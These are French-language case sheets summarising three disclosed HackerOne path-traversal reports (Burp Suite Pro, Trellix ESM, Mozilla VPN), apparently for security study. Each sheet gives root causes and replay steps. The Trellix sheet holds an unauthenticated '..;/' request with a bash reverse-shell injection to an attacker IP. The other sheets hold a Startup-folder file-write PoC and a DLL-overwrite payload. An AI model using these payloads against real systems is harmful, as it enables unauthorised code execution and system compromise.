# Fiches SSS — Path Traversal

*3 cas sélectionnés dans le corpus 2025-2026 — extraits verbatim des fichiers bruts.*

---

### Burp Suite Pro: browser-powered crawl writes attacker-controlled files via file input

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3712279)

Burp Suite Professional 2026.3.3 sur Windows. Lors d'un crawl avec le navigateur de Burp (« browser-powered crawl »), un site attaquant force l'écriture d'un fichier au contenu et au chemin contrôlés par l'attaquant. Le PoC écrit `calc.exe` dans le dossier Startup de l'utilisateur, déclenchant une exécution à la prochaine connexion. La cause est le traitement des `<input type="file">` : Burp dérive le nom du fichier d'upload depuis les attributs contrôlés par la page, sans empêcher la traversée de chemin.

**Cause racine :** Le nom du fichier temporaire d'upload est dérivé de l'attribut `accept` (tout token commençant par `.` est accepté comme extension) puis résolu par `Path.resolve()` sous un répertoire temporaire, sans assainissement : le nom peut donc sortir du dossier prévu.

**Preuve technique (verbatim depuis la source) :**

```
<input
  type="file"
  name="upload"
  value="calc.exe"
  accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">

private static File buildTemporaryUploadFile(FormInput input) throws IOException {
    String filename = input.deriveFileNameFromFileInput().orElse("file");
    Path tempDirectory = Files.createTempDirectory("burp");
    return tempDirectory.resolve(filename).toFile();
}

String accept = input.attribute("accept");
for (String token : accept.split(",")) {
    if (token.startsWith(".")) {
        fileNameBuilder.addExtension(token);
    }
}
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : Burp Suite Professional 2026.3.3 (Windows), un serveur web attaquant, l'option « Always use Burps' browser » activée dans la config de crawl.
- Étapes : 1. Servir le HTML PoC (`python -m http.server 8000`) puis l'ouvrir via `Dashboard -> New scan -> Crawl`. 2. Activer `Scan configuration -> Deep -> Crawl configuration -> Browser behaviour -> Always use Burps' browser`, démarrer le crawl. 3. Vérifier `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\burp_calc.bat`, puis se déconnecter/reconnecter pour déclencher l'exécution.
- Pièges / limites : n'écrit que là où l'utilisateur peut écrire et où le répertoire parent existe ; l'exécution est différée à la prochaine connexion Windows.

**Reproductibilité :** haute — aucun compte requis, instance et page locales, étapes complètes dans la source.

**Techniques :** path traversal in generated upload filename, attacker-controlled page attribute, arbitrary file write, delayed rce via startup folder, crawler file input handling

**Correspond aux classes qualifiantes :** path traversal, arbitrary file write, rce

**Signal (endpoints/fonctions observés) :**
- `<input type="file">` et son attribut `accept`
- `prepareFileInput(FormInput input)`
- `buildTemporaryUploadFile(FormInput input)`

**Paramètres impliqués :** `accept`, `value`, `name`

---

### Unauthenticated Path Traversal and Command Injection in Trellix ESM 11.6.10

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/2817658)

Trellix Enterprise Security Manager 11.6.10 (Linux, version d'essai publique). Le produit expose l'API interne `Snowservice` sans authentification via la séquence de path traversal `..;/`, puis exécute une injection de commande en root. L'accès non authentifié à l'API interne et l'absence de validation des entrées mènent à une exécution de code à distance complète (reverse shell).

**Cause racine :** La configuration Apache `ProxyPass /rs ajp://localhost:8009/rs` fait suivre les requêtes vers un backend AJP sans validation : `..;/` contourne la normalisation de chemin et atteint des routes internes non authentifiées, dont le paramètre `name` finit injecté dans une commande exécutée en root.

**Preuve technique (verbatim depuis la source) :**

```
ProxyPass         /rs  ajp://localhost:8009/rs

POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.0
Host: [ESM IP]
…
{
    "serverName": "test132", 
    "ip": "127.0.0.1",
    "port": "1212",
    "peerPort": "1210"
}

"name": "`bash -i >& /dev/tcp/[Attacker IP]/2137 0>&1`", 
"signal": "Restart"
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte (accès non authentifié) ; instance ESM 11.6.10 joignable en HTTP.
- Étapes : 1. Accéder sans authentification à `POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode` pour confirmer l'accès à l'API interne. 2. Soumettre la requête `CreateNode` pour valider l'accès par path traversal à l'API interne. 3. Exploiter l'injection de commande via `ManageNode` (champ `name`) pour exécuter des commandes en root.
- Pièges / limites : seul 11.6.10 est testé, les autres versions « may also be affected (please verify) » ; remplacer `[ESM IP]` et `[Attacker IP]` ; le PoC de shell inverse suppose `/dev/tcp` (bash).

**Reproductibilité :** haute — aucune authentification requise, requêtes complètes et rejouables telles quelles.

**Techniques :** path traversal ..;/ bypass, ajp proxypass exposure, unauthenticated internal api access, os command injection, reverse shell

**Correspond aux classes qualifiantes :** path traversal, auth bypass, command injection, rce

**Signal (endpoints/fonctions observés) :**
- `POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode`
- `POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode`

**Paramètres impliqués :** `name`, `serverName`, `processes`, `signal`

---

### Mozilla VPN Clients: RCE via file write and path traversal

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/2995025)

Mozilla VPN Client : la commande `live_reload` de l'inspector accepte des fichiers distants, et le fichier téléchargé est écrit dans un dossier tmp en concaténant simplement le dossier et le nom de fichier fourni. Un path traversal permet d'écraser n'importe quel fichier du système (testé sous Windows), par exemple une DLL, menant à une RCE via une interaction utilisateur limitée (ouvrir le site attaquant) quand les staging servers sont utilisés.

**Cause racine :** `InspectorHotreloader::fetchAndAnnounce()` construit `temp_path` par concaténation `"%1/%2"` du répertoire QML et de `path.fileName()`, et ce nom provient de la commande `live_reload` envoyée par la page attaquante — aucune validation de traversée.

**Preuve technique (verbatim depuis la source) :**

```
auto temp_path = QString("%1/%2").arg(m_qml_folder, path.fileName());
auto temp_file = new QFile(temp_path);
temp_file->open(QIODevice::WriteOnly);
```

```js
payload = `live_reload ${attacker_server}/..\\..\\traversal_poc.dll`
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : Mozilla VPN avec le mode développeur activé + « Use Staging Servers » ; serveur attaquant en HTTP (pas HTTPS).
- Étapes : 1. Activer le mode développeur : menu Help, cliquer 6 fois rapidement sur le titre « Help », cocher « Use Staging Servers », fermer puis rouvrir. 2. Ouvrir la page HTML attaquante qui envoie `live_reload` sur le WebSocket local `ws://localhost:8765/`. 3. Constater l'écriture du fichier dans `C:\Users\user\AppData\Local\Mozilla` au lieu de `C:\Users\user\AppData\Local\Mozilla\Mozilla VPN\hot_reload`.
- Pièges / limites : « does not work on macOS » ; exploitable seulement si les staging servers sont utilisés ; serveur attaquant en HTTP uniquement.

**Reproductibilité :** moyenne — nécessite que la victime active le mode développeur/staging et ouvre la page attaquante ; étapes complètes.

**Techniques :** path traversal file write, dll overwrite, websocket local command injection, limited user interaction rce

**Correspond aux classes qualifiantes :** path traversal, arbitrary file write, rce

**Signal (endpoints/fonctions observés) :**
- WebSocket `ws://localhost:8765/`
- commande `live_reload` (inspector)
- `InspectorHotreloader::fetchAndAnnounce()`

**Paramètres impliqués :** `live_reload` (nom de fichier distant), `attacker_server`
